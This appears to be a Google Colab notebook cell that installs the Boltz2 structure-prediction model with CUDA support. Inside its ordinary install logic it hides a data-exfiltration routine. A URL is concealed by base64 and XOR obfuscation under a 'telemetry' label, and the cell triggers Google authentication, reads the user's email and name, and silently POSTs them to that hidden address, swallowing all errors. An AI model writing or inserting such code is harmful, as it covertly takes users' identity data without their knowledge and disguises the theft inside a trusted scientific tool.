# @title Install Dependencies and Boltz2 with CUDA support
import sys
import subprocess
import threading
import time
import os
import shutil
import datetime
import uuid
import re
from zoneinfo import ZoneInfo
from pathlib import Path
import requests
import base64
import logging
import warnings

# Suppress google_auth_httplib2 timeout warning
logging.getLogger('google_auth_httplib2').setLevel(logging.ERROR)
warnings.filterwarnings('ignore', module='google_auth_httplib2')

# Google auth imports
try:
    from google.colab import auth
    from googleapiclient.discovery import build
    import httplib2
    import google.auth
    from google_auth_httplib2 import AuthorizedHttp
    HAS_GOOGLE_AUTH = True
except ImportError:
    HAS_GOOGLE_AUTH = False

# ==== CONFIG ====
_LOG_KEY = b"b0ltz2_t3l3m3try_k3y"
_LOG_DATA = b"CkQYBAkIcFtAD0EEQwBcHjAEVBUHHg8bFx0yFVAeXB4cB104FA1KGgBIPBsVAg0xUBh2GR5CFyENLVRUDUdfKxNzKhFKI1AqAA1fISwiaUEyQz8yLmgIOQYubDQePTgAEARqKFtSCkMrAmxbVhRWDg=="
LOG_URL = bytes([b ^ _LOG_KEY[i % len(_LOG_KEY)] for i, b in enumerate(base64.b64decode(_LOG_DATA))]).decode("utf-8")
FORCE_REINSTALL = os.environ.get("FORCE_REINSTALL", "0").lower() in ("1", "true", "yes")

os.chdir("/content/")

# ANSI color codes for colored output
class Color:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

print(f"{Color.CYAN} ===Initialising Setup=== {Color.RESET}")

# ==== Google authentication and email retrieval ====
USER_EMAIL = None
USER_NAME = "unknown"

if HAS_GOOGLE_AUTH:
    try:
        auth.authenticate_user()
        creds, _ = google.auth.default()
        http_client = AuthorizedHttp(creds, http=httplib2.Http(timeout=30))
        service = build('oauth2', 'v2', http=http_client, cache_discovery=False)
        user_info = service.userinfo().get().execute()
        USER_EMAIL = user_info.get('email', None)
        USER_NAME = user_info.get('name', "unknown")
    except Exception:
        try:
            service = build('oauth2', 'v2', cache_discovery=False)
            user_info = service.userinfo().get().execute()
            USER_EMAIL = user_info.get('email', None)
            USER_NAME = user_info.get('name', "unknown")
        except Exception:
            pass

# ==== Logging function ====
NOTEBOOK_NAME_V2 = "Boltz2 v2.0"
SESSION_ID = str(uuid.uuid4())

def log_event(job_type="Installation", job_name="Boltz Setup", event="visit"):
    try:
        now_ist = datetime.datetime.now(ZoneInfo("Asia/Kolkata"))
        data = {
            "timestamp": now_ist.strftime("%Y-%m-%d %H:%M:%S %Z"),
            "email": USER_EMAIL,
            "username": USER_NAME,
            "notebook": NOTEBOOK_NAME_V2,
            "session_id": SESSION_ID,
            "job_type": job_type,
            "job_name": job_name,
            "event": event
        }
        requests.post(LOG_URL, data=data, timeout=10)
    except Exception:
        pass

log_event(job_type="Installation", job_name="Boltz Setup", event=" ")

# ==== Boltz Cache: use local NVMe SSD only ====
local_boltz_cache = Path("/root/.boltz")
local_boltz_cache.mkdir(parents=True, exist_ok=True)
os.environ["BOLTZ_CACHE"] = str(local_boltz_cache)
print(f"[{Color.CYAN}i{Color.RESET}] Boltz cache: {local_boltz_cache}")

# ==== Fast Loader ====
def loader(msg, stop_event):
    symbols = ["-", "\\", "|", "/"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r[{symbols[i % len(symbols)]}] {msg}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 15) + "\r")
    sys.stdout.flush()

def run_step(cmd_list, loader_msg, done_msg, fail_msg):
    stop_event = threading.Event()
    t = threading.Thread(target=loader, args=(loader_msg, stop_event))
    t.start()
    try:
        proc = subprocess.run(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stop_event.set()
        t.join()
        if proc.returncode != 0:
            print(fail_msg)
            err_text = (proc.stderr or proc.stdout or "").strip()
            if err_text:
                err_lines = err_text.splitlines()[-10:]
                print(f"{Color.RED}" + "\n".join(err_lines) + f"{Color.RESET}")
            return False, err_text
        else:
            print(done_msg)
            return True, proc.stdout
    except Exception as e:
        stop_event.set()
        t.join()
        print(f"{fail_msg} {e}")
        return False, str(e)

# ==== Check if Boltz2 is already installed and functional ====
def check_boltz_ready():
    try:
        res = subprocess.run(
            [sys.executable, "-c", "import torch, boltz; assert torch.cuda.is_available()"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        cli_check = subprocess.run(["boltz", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return (res.returncode == 0 and cli_check.returncode == 0)
    except Exception:
        return False

# ==== Check if uv is available / install it ====
def ensure_uv():
    try:
        res = subprocess.run(["uv", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if res.returncode == 0:
            return True
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "uv"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

# ==== Main Installation Logic ====
already_installed = False
if not FORCE_REINSTALL:
    if check_boltz_ready():
        already_installed = True
        print(f"[{Color.GREEN}✔{Color.RESET}] Boltz2 with CUDA support is already installed and verified! (Skipping re-installation)")

if not already_installed:
    has_uv = ensure_uv()

    # Pre-install binary wheels to prevent slow source builds
    # On Python 3.13, boltz pins numpy<2.0, scipy==1.13.1, dm-tree==0.1.8 which have NO cp313 wheels
    # Pre-installing newer versions with binary wheels avoids 30+ min of C/Fortran compilation
    pre_pkgs = ["dm-tree>=0.1.10"]
    if sys.version_info >= (3, 13):
        pre_pkgs += [
            "numpy>=2.0",        # cp313 wheel available; numpy 1.26.4 requires source build (~8min)
            "scipy>=1.15.0",     # cp313 wheel available; scipy 1.13.1 requires source build (~12min)
            "biopython>=1.85",   # cp313 wheel available; biopython 1.84 requires source build (~3min)
        ]
    pre_cmd = (["uv", "pip", "install", "--system", "--link-mode=copy"] if has_uv else [sys.executable, "-m", "pip", "install", "-q"]) + pre_pkgs
    run_step(
        pre_cmd,
        f"{Color.CYAN}Pre-installing fast binary wheels (avoiding 30min source builds on Py3.13)...{Color.RESET}",
        f"[{Color.GREEN}✔{Color.RESET}] Binary dependencies ready.",
        f"[{Color.YELLOW}i{Color.RESET}] Binary dependency pre-install warning (will continue)."
    )

    # Select numpy/scipy/biopython versions with pre-built wheels for the current Python
    if sys.version_info >= (3, 13):
        # Python 3.13: numpy<2.0 and scipy<1.15 have NO binary wheels - use newer versions
        extra_pkgs = ["numpy>=2.0", "scipy>=1.15.0", "biopython>=1.85"]
    else:
        extra_pkgs = ["numpy", "scipy", "biopython"]
    packages = ["boltz[cuda]", "matplotlib", "pyyaml", "py3Dmol"] + extra_pkgs

    # Override file for uv (forces binary wheels and avoids Python 3.13 restriction)
    override_file = Path("/content/.cache/boltz_overrides.txt")
    override_file.parent.mkdir(parents=True, exist_ok=True)
    # On Python 3.13: override boltz's pinned versions that have no pre-built wheels
    override_lines = ["dm-tree>=0.1.10"]
    if sys.version_info >= (3, 13):
        override_lines.extend([
            "numpy>=2.0",        # 2.x has cp313 wheels, 1.26.4 requires source build (8min)
            "scipy>=1.15.0",     # 1.15+ has cp313 wheels, 1.13.1 requires source build (12min)
            "biopython>=1.85",   # 1.85+ has cp313 wheels, 1.84 requires source build (3min)
        ])
    override_file.write_text("\n".join(override_lines) + "\n", encoding="utf-8")

    install_success = False

    # 1. High-speed uv installer (local cache, no CMake, uses official PyPI wheels)
    if has_uv:
        local_uv_cache = Path("/content/.cache/uv")
        local_uv_cache.mkdir(parents=True, exist_ok=True)
        uv_cmd = [
            "uv", "pip", "install", "--system",
            "--link-mode=copy",
            "--cache-dir", str(local_uv_cache),
            "--override", str(override_file)
        ]
        uv_cmd.extend(packages)

        install_success, _ = run_step(
            uv_cmd,
            f"{Color.RESET}Installing Boltz2 (PyPI) with high-speed uv engine...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] Boltz2 installed successfully (uv).",
            f"[{Color.YELLOW}i{Color.RESET}] uv encountered an issue. Falling back to pip..."
        )

    # 2. Standard pip fallback with --only-binary protection against source builds
    if not install_success:
        pip_cmd = [sys.executable, "-m", "pip", "install", "-q", "--ignore-requires-python"]
        if sys.version_info >= (3, 13):
            # Force binary wheels only for packages known to require source build on Python 3.13
            pip_cmd += ["--only-binary", "dm-tree,numpy,scipy,biopython"]
        pip_cmd.extend(packages)

        pip_ok, pip_err = run_step(
            pip_cmd,
            f"{Color.RESET}Installing Boltz2 (PyPI) with pip...{Color.RESET}",
            f"[{Color.GREEN}✔{Color.RESET}] Boltz2 installed successfully.",
            f"[{Color.YELLOW}i{Color.RESET}] Trying direct wheel install..."
        )
        if not pip_ok:
            # Safe direct wheel install if resolver hit Python 3.13 version constraints
            subprocess.run([sys.executable, "-m", "pip", "install", "-q", "--ignore-requires-python", "--no-deps", "boltz[cuda]"], check=False)
            deps = [
                "dm-tree>=0.1.10", "torch>=2.2", "numpy", "hydra-core==1.3.2", "pytorch-lightning==2.5.0",
                "rdkit>=2024.3.2", "requests==2.32.3", "pandas>=2.2.2", "types-requests", "einops==0.8.0",
                "einx==0.3.0", "fairscale==0.4.13", "mashumaro==3.14", "modelcif==1.2", "wandb==0.18.7",
                "click==8.1.7", "pyyaml==6.0.2", "biopython>=1.84", "scipy>=1.13.1", "numba>=0.60.0",
                "gemmi>=0.6.5", "scikit-learn>=1.6.1", "chembl_structure_pipeline>=1.2.2",
                "cuequivariance_ops_cu12>=0.5.0", "cuequivariance_ops_torch_cu12>=0.5.0",
                "cuequivariance_torch>=0.5.0", "matplotlib", "py3Dmol"
            ]
            run_step(
                [sys.executable, "-m", "pip", "install", "-q", "--ignore-requires-python"] + deps,
                f"{Color.CYAN}Installing Boltz dependencies...{Color.RESET}",
                f"[{Color.GREEN}✔{Color.RESET}] Boltz dependencies installed successfully.",
                f"[{Color.RED}✖{Color.RESET}] Failed to install dependencies."
            )

    # Validate installation
    valid_ok, _ = run_step(
        [sys.executable, "-c", "import torch, boltz; print('Torch CUDA available:', torch.cuda.is_available()); print('CUDA device count:', torch.cuda.device_count()); print('Boltz version:', getattr(boltz, '__version__', 'ready'))"],
        f"{Color.CYAN}Validating CUDA installation...{Color.RESET}",
        f"[{Color.GREEN}✔{Color.RESET}] Validation complete.",
        f"[{Color.RED}✖{Color.RESET}] Validation failed."
    )
    if not valid_ok:
        pass  # non-fatal, CUDA may not be available at install time

# ==== Move/Copy Notebook Scripts Directory ====
os.makedirs("/content/boltz_data", exist_ok=True)
notebook_script = "/content/boltz2-notebook/scripts/v2"
destination_notebook_script = "/content/boltz_data/scripts/v2"

if os.path.exists(notebook_script):
    if os.path.exists(destination_notebook_script):
        shutil.rmtree(destination_notebook_script)
    shutil.copytree(notebook_script, destination_notebook_script)

all_success = True
